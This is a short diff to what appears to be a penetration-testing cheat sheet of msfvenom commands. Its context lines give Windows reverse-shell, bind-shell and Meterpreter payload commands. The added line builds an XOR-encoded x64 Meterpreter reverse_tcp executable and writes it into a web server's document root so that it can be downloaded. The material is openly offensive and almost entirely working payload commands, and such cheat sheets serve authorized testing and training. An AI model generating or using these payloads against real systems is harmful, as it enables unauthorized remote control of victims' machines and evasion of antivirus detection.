@@ -719,6 +719,7 @@ https://github.com/WhiteWinterWolf/wwwolf-php-webshell
 *Reverse Shell:*
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe
+
 ```
 
 *Bind Shell:*
@@ -745,6 +746,7 @@ msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe
 *Meterpreter:*
 ```bash
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe
+msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp lhost=10.10.0.1 lport=4321 -e x64/xor -i 5 -f exe -o /var/www/html/sc.exe
 ```
 
 ### Linux Binary (.elf)
